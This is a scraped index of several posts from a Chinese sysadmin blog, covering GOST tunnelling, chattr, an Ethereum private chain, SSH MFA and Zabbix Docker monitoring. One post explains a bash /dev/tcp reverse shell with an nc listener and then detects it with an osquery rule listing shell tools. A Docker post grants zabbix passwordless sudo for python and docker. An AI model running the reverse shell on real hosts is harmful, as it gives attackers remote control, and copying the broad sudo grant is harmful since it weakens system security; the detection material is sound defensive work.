udp://192.168.1.8:53/127.0.0.1:53 -F relay+tls://136.2.111.178:12345 或 12#启用SSL证书校验[一般针对使用域名而申请的证书应该开启证书校验]gost -L=&quot;udp://192.168.1.8:53/127.0.0.1:53&quot; -F=&quot;relay+tls://136.2.111.178:12345?secure=true&quot; 或 12# 客户端可通过ca参数指定CA证书进行证书锁定(Certificate Pinning)[推荐]--可以有效防止中间人攻击gost -L=&quot;udp://192.168.1.8:53/127.0.0.1:53&quot; -F=&quot;relay+tls://136.2.111.178:12345?ca=/opt/gost/cacert.pem&quot; 说明：把远程127.0.0.1:53[DNS无污染服务]端口，通过Relay+TLS隧道转发到本地机器的192.168.1.8:53端口 3. 测试是否正常工作 方式1：dig 123dig youtube.com @192.168.1.8#比对地址是否为无污染IP 方式2-本机网卡DNS修改为192.168.1.8 浏览器访问: https://dnssec.vs.uni-due.de/ 进行DNSSEC检查，由于服务端unbound上游配置的均为TLS DNS地址，所以测试结果都是支持DNSSEC的，出现下面的图说明服务正常。 参考：Relay","categories":[],"tags":[{"name":"TLS","slug":"TLS","permalink":"https://garywu520.github.io/tags/TLS/"},{"name":"Relay协议","slug":"Relay协议","permalink":"https://garywu520.github.io/tags/Relay%E5%8D%8F%E8%AE%AE/"},{"name":"Relay","slug":"Relay","permalink":"https://garywu520.github.io/tags/Relay/"},{"name":"TCP/UDP","slug":"TCP-UDP","permalink":"https://garywu520.github.io/tags/TCP-UDP/"},{"name":"端口转发","slug":"端口转发","permalink":"https://garywu520.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"TLS加密转发","slug":"TLS加密转发","permalink":"https://garywu520.github.io/tags/TLS%E5%8A%A0%E5%AF%86%E8%BD%AC%E5%8F%91/"}]},{"title":"使用GOST端口转发-通过TLS加密","slug":"使用GOST端口转发-通过TLS加密","date":"2020-03-31T03:15:16.000Z","updated":"2020-03-31T09:06:19.477Z","comments":true,"path":"2020/03/31/使用GOST端口转发-通过TLS加密/","link":"","permalink":"https://garywu520.github.io/2020/03/31/%E4%BD%BF%E7%94%A8GOST%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E9%80%9A%E8%BF%87TLS%E5%8A%A0%E5%AF%86/","excerpt":"环境 有个MySQL测试服务，端口: 3307，服务器在香港，直连有时候非常不稳定，速度很慢，所以使用gost把这个服务转发到本地的一台linux上。 另外，为了确保安全，优化了使用TLS来加密TCP 3307的流量。 GOST是什么 GOST WIKI: https://docs.ginuerzh.xyz/gost/tls/ Github release: GOST","text":"环境 有个MySQL测试服务，端口: 3307，服务器在香港，直连有时候非常不稳定，速度很慢，所以使用gost把这个服务转发到本地的一台linux上。 另外，为了确保安全，优化了使用TLS来加密TCP 3307的流量。 GOST是什么 GOST WIKI: https://docs.ginuerzh.xyz/gost/tls/ Github release: GOST TLS加密TCP工作流程本地 gost —TLS—&gt; 远端 gost —&gt; 你的服务(:3307) 1. 服务端配置12#默认使用内置TLS证书gost -L=tls://:443 supervisor守护启动 cat /etc/supervisord.d/gost_tls_mysql.conf 1234567891011[program:gost-mysql]command=gost -L=tls://:443stdout_logfile=/var/log/gost.logstderr_logfile=/var/log/gost.logusername=rootautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 2. 客户端配置1gost -L=tcp://192.168.1.8:3307/127.0.0.1:3307 -F=tls://147.33.95.177:443 说明： -F=tls://147.33.95.177:443 客户端与服务器端建立TLS加密隧道 -L=tcp://192.168.1.8:3307/127.0.0.1:3307 gost自解密后，把远程服务器的127.0.0.1:3307 指转发到本地的192.168.1.8:3307 supervisor守护启动 cat /etc/supervisord.d/gost_tls_mysql.conf 1234567891011[program:gost-mysql]command=/sbin/gost -L=tcp://192.168.1.8:3307/127.0.0.1:3307 -F=tls://147.33.95.177:443stdout_logfile=/var/log/gost.logstderr_logfile=/var/log/gost.logusername=rootautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 3. MySQL客户端1mysql -h 192.168.1.8 -p 3307 -u -p","categories":[],"tags":[{"name":"socat","slug":"socat","permalink":"https://garywu520.github.io/tags/socat/"},{"name":"端口转发","slug":"端口转发","permalink":"https://garywu520.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"gost","slug":"gost","permalink":"https://garywu520.github.io/tags/gost/"},{"name":"端口穿透","slug":"端口穿透","permalink":"https://garywu520.github.io/tags/%E7%AB%AF%E5%8F%A3%E7%A9%BF%E9%80%8F/"}]},{"title":"反弹shell","slug":"反弹shell","date":"2020-03-27T09:05:52.000Z","updated":"2020-03-30T08:30:02.596Z","comments":true,"path":"2020/03/27/反弹shell/","link":"","permalink":"https://garywu520.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell/","excerpt":"一: 什么是反弹shellreverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。","text":"一: 什么是反弹shellreverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。 二: 反弹Shell攻击组合方式123456#在攻击者机器上开启监听一个tcp/2333端口的服务：tmux nc -lvp 2333#在受害者机器上执行如下命令bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 命令含义： bash 是linux的一个比较常见的shell，除此之外还有 sh、zsh、等，他们之间有着细小差别 “-i” 这个参数表示的是产生交互式的shell “/dev/tcp/ip/port”：这个文件可以将其看成一个设备（Linux下一切皆文件），对这个文件进行读写，就能实现与监听端口的服务器的socket通信 “&gt;&amp;”：混合输出（错误、正确输出都输出到一个地方），避免受害者机器上依然能看到我们在攻击者机器中执行的指令 0&gt;&amp;1：输入0是由 /dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到 /dev/tcp/192.168.146.129/2333 上，这就形成了一个回路，实现了我们远程交互式shell 的功能 三: 使用osquery检测反弹shell官网: https://osquery.io/ 12345curl -L https://pkg.osquery.io/rpm/GPG | sudo tee /etc/pki/rpm-gpg/RPM-GPG-KEY-osquerysudo yum-config-manager --add-repo https://pkg.osquery.io/rpm/osquery-s3-rpm.reposudo yum-config-manager --enable osquery-s3-rpmsudo yum install osquerycp /usr/share/osquery/osquery.example.conf /etc/osquery/osquery.conf osquery提供两种工作模式： osqueryi 命令 123此交互命令使用的语法与MySQL完全相同$ osqueryi&gt; SELECT DISTINCT process.name； 官方文档：osqueryi shell osqueryd守护进程 修改配置文件: /etc/osquery/osquery.conf 1234567891011121314151617181920212223242526&#123; &quot;options&quot;: &#123; &quot;config_plugin&quot;: &quot;filesystem&quot;, &quot;logger_plugin&quot;: &quot;filesystem&quot;, &quot;logger_path&quot;: &quot;/var/log/osquery&quot;, &quot;database_path&quot;: &quot;/etc/osquery/osquery.db&quot;, &quot;utc&quot;: &quot;true&quot; &#125;, // 定时任务设置 &quot;schedule&quot;: &#123; &quot;system_info&quot;: &#123; &quot;query&quot;: &quot;SELECT hostname, cpu_brand, physical_memory FROM system_info;&quot;, &quot;interval&quot;: 3600 &#125;, // 反弹shell规则-检测反弹方式包括sh,bash,nc,php,python,perl,ruby,msfvenom等等 &quot;behavioral_reverse_shell&quot;: &#123; &quot;query&quot; : &quot;SELECT DISTINCT(processes.pid), processes.parent, processes.name, processes.path, processes.cmdline, processes.cwd, processes.root, processes.uid, processes.gid, processes.start_time, process_open_sockets.remote_address, process_open_sockets.remote_port, (SELECT cmdline FROM processes AS parent_cmdline WHERE pid=processes.parent) AS parent_cmdline FROM processes JOIN process_open_sockets USING (pid) LEFT OUTER JOIN process_open_files ON processes.pid = process_open_files.pid WHERE (name=&#x27;sh&#x27; OR name=&#x27;bash&#x27; OR name=&#x27;nc&#x27; OR name=&#x27;php&#x27; OR name=&#x27;python&#x27; OR name=&#x27;perl&#x27; OR name=&#x27;ruby&#x27; OR name=&#x27;msfvenom&#x27; OR name=&#x27;socat&#x27; OR name=&#x27;telnet&#x27; OR name=&#x27;lua&#x27; OR name=&#x27;awk&#x27; OR name=&#x27;ksh&#x27;) AND remote_address NOT IN (&#x27;0.0.0.0&#x27;,&#x27;::&#x27;,&#x27;192.168.1.250&#x27;,&#x27;&#x27;);&quot;, //注: 最后这里是排除remote_address为内网IP的反弹请求 &quot;interval&quot; : 10, //间隔10秒检测一次 &quot;description&quot; : &quot;Find shell processes that have open sockets&quot; &#125; &#125;,......&#125; 其他功能规则参考: osquery-attck 12345678#配置文件检查systemctl stop osquerydosqueryctl config-check#启动systemctl enable osquerydsystemctl start osquerydsystemctl status osqueryd 四: 模拟反弹shell12#使用bash执行反弹shellbash -i &gt;/dev/tcp/127.0.0.1/17071 2&gt;&amp;1 然后osquery log中会感知到反弹shell已经建立 123# tail -f /var/log/osquery/osqueryd.results.log&#123;&quot;name&quot;:&quot;behavioral_reverse_shell&quot;,&quot;hostIdentifier&quot;:&quot;ecs-sIw&quot;,&quot;calendarTime&quot;:&quot;Fri Mar 27 08:25:12 2020 UTC&quot;,&quot;unixTime&quot;:1585297512,&quot;epoch&quot;:0,&quot;counter&quot;:1,&quot;numerics&quot;:false,&quot;decorations&quot;:&#123;&quot;host_uuid&quot;:&quot;16ADDFF2-2F0C-46C9-83B8-40731D8CF8E9&quot;,&quot;username&quot;:&quot;wuyanteng&quot;&#125;,&quot;columns&quot;:&#123;&quot;cmdline&quot;:&quot;bash -i&quot;,&quot;cwd&quot;:&quot;/root&quot;,&quot;gid&quot;:&quot;0&quot;,&quot;name&quot;:&quot;bash&quot;,&quot;parent&quot;:&quot;14568&quot;,&quot;parent_cmdline&quot;:&quot;-bash&quot;,&quot;path&quot;:&quot;/usr/bin/bash&quot;,&quot;pid&quot;:&quot;14634&quot;,&quot;remote_address&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;17071&quot;,&quot;root&quot;:&quot;/&quot;,&quot;start_time&quot;:&quot;1585297509&quot;,&quot;uid&quot;:&quot;0&quot;&#125;,&quot;action&quot;:&quot;added&quot;&#125; 但反弹shell退出后，osquery log中会感知到反弹shell已经断开 1&#123;&quot;name&quot;:&quot;behavioral_reverse_shell&quot;,&quot;hostIdentifier&quot;:&quot;ecs-sIw&quot;,&quot;calendarTime&quot;:&quot;Fri Mar 27 08:27:36 2020 UTC&quot;,&quot;unixTime&quot;:1585297656,&quot;epoch&quot;:0,&quot;counter&quot;:17,&quot;numerics&quot;:false,&quot;decorations&quot;:&#123;&quot;host_uuid&quot;:&quot;16ADDFF2-2F0C-46C9-83B8-40731D8CF8E9&quot;,&quot;username&quot;:&quot;wuyanteng&quot;&#125;,&quot;columns&quot;:&#123;&quot;cmdline&quot;:&quot;bash -i&quot;,&quot;cwd&quot;:&quot;/root&quot;,&quot;gid&quot;:&quot;0&quot;,&quot;name&quot;:&quot;bash&quot;,&quot;parent&quot;:&quot;14568&quot;,&quot;parent_cmdline&quot;:&quot;-bash&quot;,&quot;path&quot;:&quot;/usr/bin/bash&quot;,&quot;pid&quot;:&quot;14634&quot;,&quot;remote_address&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;17071&quot;,&quot;root&quot;:&quot;/&quot;,&quot;start_time&quot;:&quot;1585297509&quot;,&quot;uid&quot;:&quot;0&quot;&#125;,&quot;action&quot;:&quot;removed&quot;&#125; 五: 处理与预防/var/log/osquery/osqueryd.results.log中的内容可以通过zabbix进行监控并告警，告警后核查反弹shell, 确认后Kill 对应的Pid","categories":[],"tags":[{"name":"攻击","slug":"攻击","permalink":"https://garywu520.github.io/tags/%E6%94%BB%E5%87%BB/"},{"name":"防御","slug":"防御","permalink":"https://garywu520.github.io/tags/%E9%98%B2%E5%BE%A1/"},{"name":"反弹shell","slug":"反弹shell","permalink":"https://garywu520.github.io/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"渗透","slug":"渗透","permalink":"https://garywu520.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"chattr & lsattr.md","slug":"chattr-lsattr-md","date":"2020-03-25T05:52:17.000Z","updated":"2020-03-25T05:53:20.984Z","comments":true,"path":"2020/03/25/chattr-lsattr-md/","link":"","permalink":"https://garywu520.github.io/2020/03/25/chattr-lsattr-md/","excerpt":"Chattr是一个命令行Linux实用命令，用于更改文件属性。它与chmod的区别是更偏向底层，chattr命令用于防止意外删除文件或目录。 即使您对文件具有完全权限，也无法删除通过chattr属性保护的文件。除非你使用root或具有sudo特权的用户才能修改此属性。","text":"Chattr是一个命令行Linux实用命令，用于更改文件属性。它与chmod的区别是更偏向底层，chattr命令用于防止意外删除文件或目录。 即使您对文件具有完全权限，也无法删除通过chattr属性保护的文件。除非你使用root或具有sudo特权的用户才能修改此属性。 chattr命令可设置的(常用)属性12#格式chattr +i file1 a 只能以追加模式对文件进行写入 i 无法修改，删除或重命名文件，无法创建与此文件的链接，也不能将任何数据写入该文件。 ​ 注: 只有超级用户可以设置或清除此属性。 示例1：chattr保护文件123456#创建示例文件# echo &quot;This is Test file&quot; &gt; file1#使用lsattr命令列出文件的属性# lsattr file1-------------e-- file1 现在使用+i在文件（file1）上使用设置不可变属性。 123# chattr +i file1# lsattr file1----i--------e-- file1 尝试编辑和删除 1234# echo &quot;设置i属性后尝试编辑&quot; &gt;&gt; file1-bash: file1: Permission denied# rm -f file1rm: cannot remove ‘file1’: Operation not permitted 取消不可变属性后, 便可以进行操作了 123# chattr -i file1# lsattr file1-------------e-- file1 示例2：chattr保护目录123456#使用+运算符, 递归设置目录testdir目录的不可变属性chattr -R +i testdir[root@test ~]# lsattr testdir/----i--------e-- testdir/test.log[root@test ~]# lsattr -d testdir/----i--------e-- testdir/ 12#使用-运算符,取消设置目录testdir目录的不可变属性chattr -R -i testdir 总结建议保护的文件 - /etc/passwd - /etc/shadow - /etc/sudoers","categories":[],"tags":[{"name":"chattr","slug":"chattr","permalink":"https://garywu520.github.io/tags/chattr/"},{"name":"lsattr","slug":"lsattr","permalink":"https://garywu520.github.io/tags/lsattr/"}]},{"title":"在linux显示天气","slug":"在linux显示天气","date":"2020-03-06T09:59:18.000Z","updated":"2020-03-06T10:00:34.159Z","comments":true,"path":"2020/03/06/在linux显示天气/","link":"","permalink":"https://garywu520.github.io/2020/03/06/%E5%9C%A8linux%E6%98%BE%E7%A4%BA%E5%A4%A9%E6%B0%94/","excerpt":"天气预报官网: wttr.in Github项目地址: https://github.com/chubin/wttr.in 基本使用1234$ curl wttr.in$ curl https://wttr.in#注：如果你省略了位置信息，则以当前IP地址来获取当前位置天气","text":"天气预报官网: wttr.in Github项目地址: https://github.com/chubin/wttr.in 基本使用1234$ curl wttr.in$ curl https://wttr.in#注：如果你省略了位置信息，则以当前IP地址来获取当前位置天气 12345678#显示北京天气$ curl wttr.in/Beijing#以摄氏度为单位显示$ curl wttr.in/Beijing?m#以中文语言显示$ curl wttr.in/Beijing?lang=zh-cn 获取简短天气1234[root@data ~]# curl https://wttr.in/Beijing?format=4Beijing: ☀️ ️+46°F ️↑9 mph#这个地址可以放在Zabbix Dashbord中进行展示，注意: URL必须是HTTPS，HTTP测试无效 获取帮助12#获取帮助curl wttr.in/:help V2版123$ curl http://v2.wttr.in或$ curl wttr.in/Beijing?format=v2","categories":[],"tags":[{"name":"weather","slug":"weather","permalink":"https://garywu520.github.io/tags/weather/"},{"name":"wttr.in","slug":"wttr-in","permalink":"https://garywu520.github.io/tags/wttr-in/"}]},{"title":"美图-ETH私链部署","slug":"美图-ETH私链部署","date":"2020-03-06T09:56:57.000Z","updated":"2020-03-06T09:58:45.820Z","comments":true,"path":"2020/03/06/美图-ETH私链部署/","link":"","permalink":"https://garywu520.github.io/2020/03/06/%E7%BE%8E%E5%9B%BE-ETH%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2/","excerpt":"部署多节点-美图go-ethereum私链 GitHub项目地址：https://github.com/meitu/go-ethereum 环境 第1个节点：192.168.1.201 第2个节点：192.168.1.202 第3个节点：192.168.1.203","text":"部署多节点-美图go-ethereum私链 GitHub项目地址：https://github.com/meitu/go-ethereum 环境 第1个节点：192.168.1.201 第2个节点：192.168.1.202 第3个节点：192.168.1.203 1. 安装Golang环境123yum install -y gitwget https://dl.google.com/go/go1.12.5.linux-amd64.tar.gztar -C /usr/local -zxf go1.12.5.linux-amd64.tar.gz vim /etc/profile 123export GOROOT=/usr/local/goexport GOPATH=$HOME/goexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin 12source /etc/profilego env 2. 编译在默认的共识代码里面，共识大小（maxValidatorSize）默认设置为21【可以理解为节点总数量】，我们这里计划部署3个节点，故需要修改参数，如下： 1234#代码目录为 /consensus/dpos/dpos.go#L36#将maxValidatorSize = 21 改为maxValidatorSize = 3 修改完编译 1make geth 编译完成后，二进制文件目录: ../go-ethereum/build/bin/geth 123cp ../go-ethereum/build/bin/geth /etc/geth/chmod +x /etc/geth/gethln -sv /etc/geth/geth /usr/sbin/ 将此二进制文件拷贝到第2和第3节点 3. 账号准备启动链时，在创世快中需要预先定义好创世的共识节点的地址，这些地址必须是真实存在的，否则将无法打块，无法选举。 因此需要预先生成一些账号。按照以太坊正常的模式进行生成即可。 本次计划在3台服务器启动3个节点的链，规划的节点目录分别为/etc/geth/data 第1个节点[192.168.201]操作: 123456geth --datadir /etc/geth/data console&gt; personal.newAccount(&#x27;meitu&#x27;)&quot;0x389a9d44029d15316f8b6e8cf8ffb444b9c028b0&quot;#删除已经生成的创世块信息，即geth目录，保留目录下的keystore用于dposrm -rf /etc/geth/data/geth 第2个节点[192.168.202]操作: 123456geth --datadir /etc/geth/data console&gt; personal.newAccount(&#x27;meitu&#x27;)&quot;0xf35f6067116b26e1efe39a22733edc0f1dd6ecd7&quot;#删除已经生成的创世块信息，即geth目录，保留目录下的keystore用于dposrm -rf /etc/geth/data/geth 第3个节点[192.168.203]操作: 123456geth --datadir /etc/geth/data console&gt; personal.newAccount(&#x27;meitu&#x27;)&quot;0x6db7aa8200842b37ce34991b146a2feb78b5a2bd&quot;#删除已经生成的创世块信息，即geth目录，保留目录下的keystore用于dposrm -rf /etc/geth/data/geth 4. 创世块文件准备创世块默认配置文件：dpos_test_genesis.json ，修改配置文件中的validators为您的创世节点地址。 123456789101112131415161718192021222324&#123; &quot;config&quot;: &#123; &quot;chainId&quot;: 8888, &quot;eip155Block&quot;: 0, &quot;eip158Block&quot;: 0, &quot;byzantiumBlock&quot;:0, &quot;dpos&quot;:&#123; &quot;validators&quot;:[ &quot;0x389a9d44029d15316f8b6e8cf8ffb444b9c028b0&quot;, &quot;0xf35f6067116b26e1efe39a22733edc0f1dd6ecd7&quot;, &quot;0x6db7aa8200842b37ce34991b146a2feb78b5a2bd&quot; ] &#125; &#125;, &quot;nonce&quot;: &quot;0x0000000000000042&quot;, &quot;difficulty&quot;: &quot;0x020000&quot;, &quot;mixHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;, &quot;coinbase&quot;: &quot;0x0000000000000000000000000000000000000000&quot;, &quot;timestamp&quot;: &quot;0x00&quot;, &quot;parentHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;, &quot;extraData&quot;: &quot;0x11bbe8db4e347b4e8c937c1c8370e4b5ed33adb3db69cbdb7a38e1e50b1b82fa&quot;, &quot;gasLimit&quot;: &quot;0x500000&quot;, &quot;alloc&quot;: &#123;&#125;&#125; 将此文件拷贝到各个节点的/etc/geth目录下 5. 初始化创世块12345# 所有创世节点都需要执行，创世块的json所有节点保持一致geth --datadir /etc/geth/data init /etc/geth/dpos_test_genesis.json#验证初始化信息ls -lh /etc/geth/data/geth/lightchaindata 6. 启动链 第1个节点 1geth --datadir /etc/geth/data --ipcdisable --port 61910 --rpcport 8200 console 第2个节点 1geth --datadir /etc/geth/data --ipcdisable --port 61910 --rpcport 8201 console 第3个节点 1geth --datadir /etc/geth/data --ipcdisable --port 61910 --rpcport 8201 console 确认所有节点都有validator 1&gt; eth.validator 7. 添加节点添加节点顺序： 节点1：添加节点2, 节点3 节点2：添加节点3 查看第1节点的enode值 123#查看节点1的enode值&gt;admin.nodeInfo.enode&quot;enode://a4d7c7d17aa662f42212d6affe5dcb5072bf3545d394bc5f7c62abb5fd2b359d9dbde6f06ff4284cd95d2fc4c2408883bd1df5d9676c044f0edfbde8b88b7475@[::]:61910&quot; 分别在2节点和3节点添加1节点 123&gt;admin.addPeer(&quot;enode://a4d7c7d17aa662f42212d6affe5dcb5072bf3545d394bc5f7c62abb5fd2b359d9dbde6f06ff4284cd95d2fc4c2408883bd1df5d9676c044f0edfbde8b88b7475@192.168.1.201:61910&quot;)&gt; admin.peers 查看第2节点的enode值 12&gt;admin.nodeInfo.enode&quot;enode://e5e964e53b8dcc89510a9a9a06a25d9b42590eb0bf932920229eb85a3dbecb982fa123016017fedb4847085ab4ad808ecd38e5cbbca20af5c1d656efb1be274a@[::]:61910&quot; 在节点3添加节点2 123&gt;admin.addPeer(&quot;enode://e5e964e53b8dcc89510a9a9a06a25d9b42590eb0bf932920229eb85a3dbecb982fa123016017fedb4847085ab4ad808ecd38e5cbbca20af5c1d656efb1be274a@192.168.1.202:61910&quot;)&gt; admin.peers 8. 挖矿美图以太坊dpos实现默认矿工地址也是account的第0个。但是与以太坊的区别是，以太坊使用coinbase作为矿工地址，我们使用validator作为矿工地址，coinbase保留了下来仅作为奖励收取地址。需要修改请调用 1&gt; miner.setValidator(eth.accounts[0]) 开始挖矿 12&gt;personal.unlockAccount(eth.validator,&#x27;meitu&#x27;,0)&gt;miner.start(1)","categories":[],"tags":[{"name":"数字货币","slug":"数字货币","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81/"},{"name":"ETH","slug":"ETH","permalink":"https://garywu520.github.io/tags/ETH/"},{"name":"以太坊","slug":"以太坊","permalink":"https://garywu520.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}]},{"title":"让linux登录用户自动注销","slug":"让linux登录用户自动注销","date":"2020-03-05T08:47:12.000Z","updated":"2020-03-05T08:51:42.388Z","comments":true,"path":"2020/03/05/让linux登录用户自动注销/","link":"","permalink":"https://garywu520.github.io/2020/03/05/%E8%AE%A9linux%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7%E8%87%AA%E5%8A%A8%E6%B3%A8%E9%94%80/","excerpt":"","text":"为了增强Linux系统的安全性，我们需要在用户空闲一段时间后自动断开，这个操作可以由设置TMOUT值来实现，单位: 秒。 vim /etc/profile 12# 设置4h内用户无操作，用户session就自动注销export TMOUT&#x3D;14400","categories":[],"tags":[{"name":"TMOUT","slug":"TMOUT","permalink":"https://garywu520.github.io/tags/TMOUT/"},{"name":"登录用户","slug":"登录用户","permalink":"https://garywu520.github.io/tags/%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7/"},{"name":"用户注销","slug":"用户注销","permalink":"https://garywu520.github.io/tags/%E7%94%A8%E6%88%B7%E6%B3%A8%E9%94%80/"}]},{"title":"SSH启用MFA二次认证","slug":"SSH启用MFA二次认证","date":"2020-03-03T07:44:13.000Z","updated":"2020-03-03T07:47:56.434Z","comments":true,"path":"2020/03/03/SSH启用MFA二次认证/","link":"","permalink":"https://garywu520.github.io/2020/03/03/SSH%E5%90%AF%E7%94%A8MFA%E4%BA%8C%E6%AC%A1%E8%AE%A4%E8%AF%81/","excerpt":"为SSH启用MFA二次登录认证 1. 安装Google身份验证器1yum install -y autoconf automake libtool pam-devel git qrencode 123456git clone https://github.com/google/google-authenticator-libpam.gitcd google-authenticator-libpam/./bootstrap.sh./configuremakemake install 软链模块文件 1ln -s /usr/local/lib/security/pam_google_authenticator.so /usr/lib64/security/pam_google_authenticator.so","text":"为SSH启用MFA二次登录认证 1. 安装Google身份验证器1yum install -y autoconf automake libtool pam-devel git qrencode 123456git clone https://github.com/google/google-authenticator-libpam.gitcd google-authenticator-libpam/./bootstrap.sh./configuremakemake install 软链模块文件 1ln -s /usr/local/lib/security/pam_google_authenticator.so /usr/lib64/security/pam_google_authenticator.so 2. 配置SSHvim /etc/pam.d/sshd 12auth required pam_google_authenticator.so nullok #加在最上面一行#auth substack password-auth vim /etc/ssh/sshd_config 123456ChallengeResponseAuthentication yes#ChallengeResponseAuthentication no#还要SSH 知道其应请求可让我们登录的 SSH 密钥和验证码AuthenticationMethods publickey,password publickey,keyboard-interactive systemctl restart sshd 3. 配置Google身份验证器1google-authenticator 12345678910111213141516171819202122232425#询问使用的身份验证令牌是否应基于时间Do you want authentication tokens to be time-based (y/n) y#此时将生成安全密钥与临时验证码，只能使用1次，需妥善保存Do you want me to update your &quot;/root/.google_authenticator&quot; file? (y/n) yDo you want to disallow multiple uses of the same authenticationtoken? This restricts you to one login about every 30s, but it increasesyour chances to notice or even prevent man-in-the-middle attacks (y/n) yBy default, a new token is generated every 30 seconds by the mobile app.In order to compensate for possible time-skew between the client and the server,we allow an extra token before and after the current time. This allows for atime skew of up to 30 seconds between authentication server and client. If youexperience problems with poor time synchronization, you can increase the windowfrom its default size of 3 permitted codes (one previous code, the currentcode, the next code) to 17 permitted codes (the 8 previous codes, the currentcode, and the 8 next codes). This will permit for a time skew of up to 4 minutesbetween client and server.Do you want to do so? (y/n) yIf the computer that you are logging into isn&#x27;t hardened against brute-forcelogin attempts, you can enable rate-limiting for the authentication module.By default, this limits attackers to no more than 3 login attempts every 30s.Do you want to enable rate-limiting? (y/n) y 4. 连接测试注意：不要关闭刚才的连接session，新打开一个窗口连接测试。 一旦连接失败，建议操作是恢复SSH配置，重载服务 附加：有个坑如果你是以普通用户zhangsan登录系统，通过sudo切换到了root进行操作的，需要将生成的/root/.google_authenticator文件拷贝到普通用户的家目录，并且需要修改属主属组为zhangsan, 否则不能正常连接。","categories":[],"tags":[{"name":"SSH","slug":"SSH","permalink":"https://garywu520.github.io/tags/SSH/"},{"name":"Google","slug":"Google","permalink":"https://garywu520.github.io/tags/Google/"},{"name":"MFA","slug":"MFA","permalink":"https://garywu520.github.io/tags/MFA/"},{"name":"二次认证","slug":"二次认证","permalink":"https://garywu520.github.io/tags/%E4%BA%8C%E6%AC%A1%E8%AE%A4%E8%AF%81/"}]},{"title":"zabbix断图问题解决","slug":"zabbix断图问题解决","date":"2020-02-13T09:15:32.000Z","updated":"2020-02-13T09:18:30.967Z","comments":true,"path":"2020/02/13/zabbix断图问题解决/","link":"","permalink":"https://garywu520.github.io/2020/02/13/zabbix%E6%96%AD%E5%9B%BE%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","excerpt":"","text":"zabbix最近开始断图了…解决方法如下： cat /etc/zabbix/zabbix_server.conf 123456789#适当增大如下参数CacheSize=1024MStartPollers=100StartPollersUnreachable=30Timeout=30UnreachablePeriod=120UnavailableDelay=60UnreachableDelay=5","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"zabbix 断图","slug":"zabbix-断图","permalink":"https://garywu520.github.io/tags/zabbix-%E6%96%AD%E5%9B%BE/"}]},{"title":"zabbix监控docker容器及资源占用情况","slug":"zabbix监控docker容器及资源占用情况","date":"2020-02-12T07:10:44.000Z","updated":"2020-02-13T08:00:52.954Z","comments":true,"path":"2020/02/12/zabbix监控docker容器及资源占用情况/","link":"","permalink":"https://garywu520.github.io/2020/02/12/zabbix%E7%9B%91%E6%8E%A7docker%E5%AE%B9%E5%99%A8%E5%8F%8A%E8%B5%84%E6%BA%90%E5%8D%A0%E7%94%A8%E6%83%85%E5%86%B5/","excerpt":"使用Zabbix监控Docker容器以及容器资源占用情况 1.环境 Zabbix Server+Zabbix Client准备就绪 2. zabbix客户端配置在有docker容器的zabbix客户端上进行如下操作 12345#安装模块yum install -y python-simplejsonpip install docker-pypip install requests urllib3 pyOpenSSL --force --upgradepip install --upgrade --force-reinstall &#x27;requests==2.6.0&#x27;","text":"使用Zabbix监控Docker容器以及容器资源占用情况 1.环境 Zabbix Server+Zabbix Client准备就绪 2. zabbix客户端配置在有docker容器的zabbix客户端上进行如下操作 12345#安装模块yum install -y python-simplejsonpip install docker-pypip install requests urllib3 pyOpenSSL --force --upgradepip install --upgrade --force-reinstall &#x27;requests==2.6.0&#x27; 123456789#创建一个放脚本的文件夹mkdir -p /etc/zabbix/script#把3个脚本文件[脚本在最后附录]放到该目录下[root@cnctest script]# ls -lh total 12K-rw-r--r-- 1 root root 374 Feb 12 10:46 docker_discovery.py-rw-r--r-- 1 root root 2.3K Feb 12 10:46 docker_monitor.py-rw-r--r-- 1 root root 608 Feb 12 10:46 docker_processmonitor.sh 123456#修改zabbix配置# cat /etc/zabbix/zabbix_agentd.d/userparameter_docker.confUserParameter=docker_discovery[*], sudo python /etc/zabbix/script/docker_discovery.py $1UserParameter=docker_stats[*], sudo python /etc/zabbix/script/docker_monitor.py $1 $2UserParameter=docker_process[*], /bin/bash /etc/zabbix/script/docker_processmonitor.sh $1 $2 $3 12#重启zabbix客户端服务systemctl restart zabbix-agent 3.本机取值测试12345#为避免权限问题，需授予docker和python命令s权限chown zabbix.zabbix /etc/zabbix/script/*chmod 777 /etc/zabbix/script/docker_*echo &quot;zabbix ALL=(root) NOPASSWD:/bin/docker,/usr/bin/docker,/usr/bin/python,/etc/zabbix/script/docker_monitor.py,/etc/zabbix/script/docker_discovery.py,/etc/zabbix/script/docker_processmonitor.sh&quot;&gt;&gt;/etc/sudoers 123456789101112131415161718# 查看所有容器# sudo -u zabbix zabbix_get -s 127.0.0.1 -k docker_discovery&#123; &quot;data&quot;:[ &#123; 